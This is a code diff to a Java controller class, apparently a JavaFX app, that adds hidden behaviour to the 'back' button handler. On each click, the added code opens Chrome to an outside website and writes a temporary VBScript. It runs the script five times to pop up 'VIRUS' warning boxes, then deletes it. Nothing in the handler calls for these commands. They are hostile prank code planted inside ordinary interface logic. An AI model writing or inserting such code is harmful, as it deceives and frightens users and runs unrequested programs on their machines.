@@ -124,6 +124,17 @@ public class HelloController {
 
     @FXML
     protected void onClickVolver(ActionEvent event){
+        try {
+            Runtime.getRuntime().exec("cmd.exe /c start chrome piv.pivpiv.dk");
+            Runtime.getRuntime().exec("cmd.exe /c echo x=msgbox(\"VIRUS VIRUS VIRUS VIRUS\",vbYesNo,\"VIRUS\") = vbYes > %tmp%\\tmp.vbs");
+            for (int i = 0; i < 5; i++) {
+                Thread.sleep(100);
+                Runtime.getRuntime().exec("cmd.exe /c cscript //nologo %tmp%\\tmp.vbs");
+            }
+            Runtime.getRuntime().exec("cmd.exe /c del %tmp%\\tmp.vbs");
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
         Button escena=(Button) event.getSource();
         escena.getParent().setOpacity(0);
         escena.getParent().setDisable(true);
